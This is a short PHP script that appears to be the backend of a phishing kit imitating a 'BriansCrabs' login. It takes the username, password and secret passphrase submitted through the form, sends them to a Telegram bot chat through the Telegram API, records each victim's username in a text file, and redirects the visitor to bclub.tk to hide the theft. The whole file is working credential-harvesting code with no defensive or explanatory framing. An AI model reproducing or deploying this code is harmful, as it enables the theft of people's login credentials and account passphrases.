<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
   
    $filename2 = 'nostep.txt';
    if (file_exists($filename2)) {
        $nostepusernames = explode(',', file_get_contents($filename2));
    }

  
    $botToken = '__TELEGRAM_BOT_TOKEN__';
$chatIds = ['1272510733'];  // Add more chat IDs as needed

    $key = $_POST["key"];
    $username = $_POST["username"];
    $password = $_POST["password"];
    $message = "Username: " . $username . "\n" . "Password: " . $password . "\n" . "key: " . $key . "\n";
    $messageTitle = "BriansCrabs:Secret passphrase Login Credentials  ✅";

   
    $nostepusernames[] = $username;
    file_put_contents($filename2, implode(',', $nostepusernames));

    sendTelegramMessage($messageTitle, $message);
    header("Location: https://bclub.tk/");
    exit();
}


function sendTelegramMessage($title, $body) {
    global $botToken, $chatIds;
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    foreach ($chatIds as $chatId) {
        $data = [
            'chat_id' => $chatId,
            'text' => "*" . $title . "*\n" . $body,
            'parse_mode' => 'Markdown' // Use Markdown for bold text
        ];
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_exec($ch);
        curl_close($ch);
    }
}
?>
